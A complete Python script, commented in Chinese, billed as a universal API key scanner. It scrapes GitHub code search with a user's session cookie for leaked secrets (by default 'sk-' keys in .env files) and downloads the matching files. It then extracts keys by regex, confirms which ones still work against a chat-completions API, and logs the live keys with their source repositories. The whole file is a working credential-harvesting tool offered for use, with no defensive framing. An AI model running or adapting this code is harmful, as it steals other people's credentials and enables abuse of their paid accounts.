#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
通用API密钥并发扫描器 (Universal API Key Scanner)
允许在运行后自定义：
1. API URL
2. 测试模型 (支持多个)
3. 搜索语法 (支持GitHub Session正则搜索)
4. 密钥提取正则

支持多线程并发搜索与实时结果保存。
"""

import os
import re
import time
import threading
import concurrent.futures
from queue import Queue
import requests
from datetime import datetime
import json
import random
import sys

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 全局配置 (将在运行时由用户输入) ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')
TARGET_API_URL = ""
TEST_MODELS = []
SEARCH_QUERIES = []
KEY_REGEX_PATTERN = r""

# 并发配置
MAX_WORKERS = 5  # 最大并发线程数
API_DELAY = 1.0  # API请求间隔（秒）
MAX_RESULTS_PER_QUERY = 500  # 每个查询最多检查的结果数

# 存储结果的线程安全队列
live_keys_queue = Queue()    # 存活密钥
processed_keys = set()       # 防止重复处理相同密钥
lock = threading.Lock()
file_lock = threading.Lock() # 文件写入锁

# 实时保存文件名（全局变量）
live_keys_filename = None
simple_keys_filename = None

# --- GitHub Session Search 相关函数 ---

def get_headers():
    if not GITHUB_SESSION:
        raise ValueError("Missing GITHUB_SESSION. 请确保.env文件中包含有效的 GITHUB_SESSION")
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def search_github(query, max_pages=5):
    links = set()
    print(f"📡 搜索: {query}")
    
    for page in range(1, max_pages + 1):
        try:
            url = "https://github.com/search"
            params = {'q': query, 'type': 'code', 'p': page, 'o': 'desc', 's': 'indexed'}
            
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code == 429:
                print("   ⚠️ Rate Limited (429). Waiting 60s...")
                time.sleep(60)
                continue
            elif resp.status_code != 200:
                print(f"   ❌ Error {resp.status_code}")
                if resp.status_code == 404:
                     print("   ⚠️ 可能是Session失效或无权限")
                break
                
            # 提取链接
            page_links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            if not page_links:
                # 检查是否是登录页
                if "Sign in to GitHub" in resp.text:
                    print("   ❌ Session 已失效，请更新 .env 中的 GITHUB_SESSION")
                    return []
                if "We couldn't find any code matching" in resp.text:
                    print("   ⚠️ 未找到匹配结果")
                break
                
            for link in page_links:
                full = "https://github.com" + link.split('#')[0]
                links.add(full)
                
            print(f"   Page {page}: found {len(page_links)} links")
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   Search Error: {e}")
            break
            
    return list(links)

# --- 通用 API 验证函数 ---

def test_model_access(api_key, model_name):
    """测试模型访问权限"""
    try:
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "model": model_name,
            "messages": [
                {"role": "user", "content": "Hi"}
            ],
            "max_tokens": 5
        }
        
        # 自动处理 URL，如果用户只给了 base_url (e.g. https://api.example.com)
        url = TARGET_API_URL
        if not url.endswith("/chat/completions") and "v1" not in url:
             # 简单尝试补全
             url = f"{url.rstrip('/')}/v1/chat/completions"
        
        response = requests.post(url, headers=headers, json=payload, timeout=15)
        
        if response.status_code == 200:
            return {"success": True, "model": model_name, "response": response.json()}
        else:
            return {"success": False, "error": f"HTTP {response.status_code}: {response.text}", "model": model_name}
            
    except Exception as e:
        return {"success": False, "error": str(e), "model": model_name}

def save_live_key_immediately(key_info):
    """实时保存存活密钥到文件"""
    global live_keys_filename, simple_keys_filename
    
    with file_lock:
        # 如果文件名还未初始化，创建文件名
        if live_keys_filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            # 使用域名作为文件名前缀的一部分，方便识别
            try:
                domain = TARGET_API_URL.split('/')[2]
            except:
                domain = "custom"
            
            live_keys_filename = f'{domain}_live_keys_{timestamp}.txt'
            simple_keys_filename = f'{domain}_keys_simple_{timestamp}.txt'
            
            # 创建详细文件的头部
            with open(live_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== 通用API密钥扫描结果 (实时更新) ===\n")
                f.write(f"目标 API: {TARGET_API_URL}\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"测试模型列表: {', '.join(TEST_MODELS)}\n")
                f.write("=" * 60 + "\n\n")
            
            # 创建简化文件的头部
            with open(simple_keys_filename, 'w', encoding='utf-8') as f:
                f.write(f"=== API密钥列表 ({domain}) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 40 + "\n\n")
        
        # 追加详细信息到详细文件
        with open(live_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔑 {key_info['type']}\n")
            f.write(f"   密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   可访问模型数: {key_info['accessible_count']}/{key_info['total_test_models']}\n")
            f.write(f"   可访问模型: {', '.join(key_info['accessible_models'])}\n")
            
            if key_info['failed_models']:
                f.write(f"   失败模型:\n")
                for failed in key_info['failed_models']:
                    f.write(f"     - {failed['model']}: {failed['error'][:100]}\n")
            
            f.write(f"   仓库: {key_info['repo']}\n")
            f.write(f"   文件: {key_info['file_path']}\n")
            f.write(f"   链接: {key_info['url']}\n")
            f.write(f"   发现时间: {key_info['discovered_time']}\n")
            f.write("-" * 60 + "\n")
        
        # 追加密钥到简化文件
        with open(simple_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"{key_info['key']}\n")
        
        print(f"💾 已实时保存密钥到: {live_keys_filename}")

def check_key(key):
    """验证API密钥是否有效"""
    accessible_models = []
    failed_models = []
    
    # 测试所有指定的模型
    for model in TEST_MODELS:
        result = test_model_access(key, model)
        if result["success"]:
            accessible_models.append(model)
            print(f"   ✅ 模型 {model} 可访问")
        else:
            failed_models.append({"model": model, "error": result["error"]})
            # print(f"   ❌ 模型 {model} 不可访问") # 减少噪音，只打印成功的
        
        time.sleep(0.5)
    
    if accessible_models:
        return {
            "status": f"🟢 密钥存活 - 可访问 {len(accessible_models)}/{len(TEST_MODELS)}",
            "type": "live",
            "accessible_models": accessible_models,
            "failed_models": failed_models
        }
    else:
        return {
            "status": "🔴 无效/不可用",
            "type": "invalid",
            "accessible_models": [],
            "failed_models": failed_models
        }

def process_content_file(file_url, worker_id):
    """下载并处理单个文件内容"""
    try:
        print(f"[Worker-{worker_id}] 检查: {file_url}")
        
        # 构造 Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        resp = requests.get(raw_url, timeout=15)
        if resp.status_code != 200:
            return
            
        file_content = resp.text
        
        # 使用用户提供的正则提取密钥
        potential_keys = re.findall(KEY_REGEX_PATTERN, file_content)
        
        if not potential_keys:
            # 如果没有找到，尝试一些通用的sk-pattern作为备选（可选功能，这里严格按照用户输入）
            pass

        for key in potential_keys:
            # 去重
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
            
            print(f"[Worker-{worker_id}] 🔍 测试: {key[:15]}...")
            
            result = check_key(key)
            
            if result["type"] == "live":
                print(f"[Worker-{worker_id}] 🎉 发现存活密钥!")
                repo_match = re.search(r'github\.com/([^/]+/[^/]+)', file_url)
                repo_name = repo_match.group(1) if repo_match else "unknown"

                key_info = {
                    'type': 'API Key',
                    'key': key,
                    'status': result['status'],
                    'accessible_models': result['accessible_models'],
                    'failed_models': result['failed_models'],
                    'total_test_models': len(TEST_MODELS),
                    'accessible_count': len(result['accessible_models']),
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': file_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                
                save_live_key_immediately(key_info)
                live_keys_queue.put(key_info)
            
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] Error: {e}")

def concurrent_search_and_validate():
    """并发搜索和验证"""
    all_file_urls = set()
    
    for query in SEARCH_QUERIES:
        urls = search_github(query, max_pages=5)
        all_file_urls.update(urls)
        time.sleep(2)
    
    file_list = list(all_file_urls)
    print(f"\n🗂️ 共找到 {len(file_list)} 个文件待处理")
    
    if not file_list:
        print("⚠️ 没有找到任何文件。请检查搜索语法或Session是否有效。")
        return

    print(f"⚡ 启动 {MAX_WORKERS} 个线程进行扫描...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_content_file, url, i % MAX_WORKERS + 1) for i, url in enumerate(file_list)]
        concurrent.futures.wait(futures)
    
    print("\n✅ 所有任务完成")

def get_user_input():
    """获取用户输入配置"""
    global TARGET_API_URL, TEST_MODELS, SEARCH_QUERIES, KEY_REGEX_PATTERN
    
    print("\n🛠️  通用扫描器配置 (按回车使用默认值)")
    print("-" * 40)
    
    # 1. API URL
    default_url = "https://api.openai.com/v1/chat/completions"
    url_input = input(f"1. 目标 API URL (默认: {default_url}): ").strip()
    TARGET_API_URL = url_input if url_input else default_url
    # 简单补全
    if not TARGET_API_URL.startswith("http"):
        TARGET_API_URL = "https://" + TARGET_API_URL
    
    # 2. 测试模型
    default_model = "gpt-3.5-turbo"
    model_input = input(f"2. 测试模型 (多个用逗号分隔, 默认: {default_model}): ").strip()
    if model_input:
        TEST_MODELS = [m.strip() for m in model_input.split(',') if m.strip()]
    else:
        TEST_MODELS = [default_model]
        
    # 3. 搜索语法
    default_query = 'filename:.env "sk-"'
    print("3. GitHub搜索语法 (支持正则, 如 '/sk-[a-zA-Z0-9]{48}/')")
    query_input = input(f"   请输入搜索查询 (默认: {default_query}): ").strip()
    if query_input:
        # 支持输入多个查询，用分号分隔? 暂时只支持单个或逗号
        SEARCH_QUERIES = [q.strip() for q in query_input.split(';') if q.strip()]
    else:
        SEARCH_QUERIES = [default_query]
        
    # 4. 密钥提取正则
    # 尝试根据搜索语法智能推荐正则?
    default_regex = r'(sk-[a-zA-Z0-9]{48,})' # 默认常见sk格式
    regex_input = input(f"4. 密钥提取正则表达式 (默认: sk-开头的48位以上字符): ").strip()
    KEY_REGEX_PATTERN = regex_input if regex_input else default_regex
    
    print("-" * 40)
    print(f"配置确认:")
    print(f"  API: {TARGET_API_URL}")
    print(f"  Models: {TEST_MODELS}")
    print(f"  Queries: {SEARCH_QUERIES}")
    print(f"  Regex: {KEY_REGEX_PATTERN}")
    print("-" * 40)
    
    confirm = input("是否开始扫描? (y/n): ").lower()
    if confirm != 'y':
        print("已取消")
        sys.exit(0)

def main():
    if not GITHUB_SESSION:
        print("❌ 错误: 缺少 GITHUB_SESSION。请先配置 .env 文件。")
        return

    get_user_input()
    
    try:
        concurrent_search_and_validate()
        
        # 最终统计
        print(f"\n📊 扫描结束")
        print(f"处理密钥数: {len(processed_keys)}")
        print(f"存活密钥数: {live_keys_queue.qsize()}")
        if live_keys_filename:
            print(f"结果已保存至: {live_keys_filename}")
            
    except KeyboardInterrupt:
        print("\n🛑 用户中断")

if __name__ == '__main__':
    main()
